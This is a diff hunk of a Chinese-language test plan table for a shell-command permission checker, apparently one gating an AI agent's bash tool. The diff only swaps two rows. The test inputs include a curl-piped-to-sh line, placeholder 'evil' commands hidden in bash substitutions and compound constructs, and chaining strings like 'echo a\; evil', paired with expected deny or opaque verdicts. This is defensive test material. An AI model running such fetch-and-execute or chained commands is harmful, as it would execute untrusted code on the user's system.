@@ -80,8 +80,8 @@ G18-06（ENV-03 在每一级）；其余每一行都拆自 rev 24 的门槛原�
 | G07-09 | BASH-01 | `echo $(curl http://x \| sh)`、`` echo `id` ``、`cat <(evil)`、`echo ${x:-$(evil)}`、`echo $((1+2))`（rung = `git_bash`） | 不透明 | BASH-01：代码承载的展开 | ubuntu / PR-2 |
 | G07-10 | BASH-01 | `f(){ evil; }; f`、`{ evil; }`、`(evil)`、`if true; then evil; fi`、`for i in 1; do evil; done`、`cat <<EOF`、`trap evil EXIT`、`exec evil`、`coproc evil` | 不透明 | BASH-01：复合构造 | ubuntu / PR-2 |
 | G07-11 | BASH-01 | `git status; git log`、`git status && git log`、`git log \| head`、`git status & git log`；`echo 'a; evil'`、`echo "a && evil"`、`echo a\; evil` | 前四条各切成两条简单命令逐条判；后三条切成一条（引号与转义按 bash 语义） | — | ubuntu / PR-2 |
-| G08-02 | TOOL-04 | `PreToolUse` hook 改写 body（hooks 计划 G8）：改成不透明文本；改成放行文本 | 前者 DENY；后者不沿用改写前的裁定，对最终文本重判 | — | ubuntu / PR-1 |
 | G08-01 | TOOL-03、SUB-01 | 不透明的 body，经 `NullTransport`；经一个 PowerShell 子代理 | DENY，两处都是 | — | ubuntu / PR-1 |
+| G08-02 | TOOL-04 | `PreToolUse` hook 改写 body（hooks 计划 G8）：改成不透明文本；改成放行文本 | 前者 DENY；后者不沿用改写前的裁定，对最终文本重判 | — | ubuntu / PR-1 |
 | G09-01 | LADDER-04 | 三个桶的降级率；`uv run ruff check .` | 在 PR-7 之前经接受；ruff 绿 | — | ubuntu / PR-7 |
 | G10-01 | LAUNCH-02、LAUNCH-03、LAUNCH-04、ENV-02、ENV-05 | 逐级的 Windows 矩阵（规范 §5 的表，含每级的 `PATH`、`PATHEXT` 与 PowerShell 级的 `PSModulePath` 钉值） | 每一级按它那一行启动 | — | windows / PR-6 |
 | G10-02 | LADDER-05、SPEC-03 | 翻转前的 Windows 默认执行器；G04–G07 的每段 body | 报 `CMD × legacy_cmd`，走 `%COMSPEC% /c`，每段 body 的裁定与 `main@3537753` 相同 | — | windows / PR-6 |
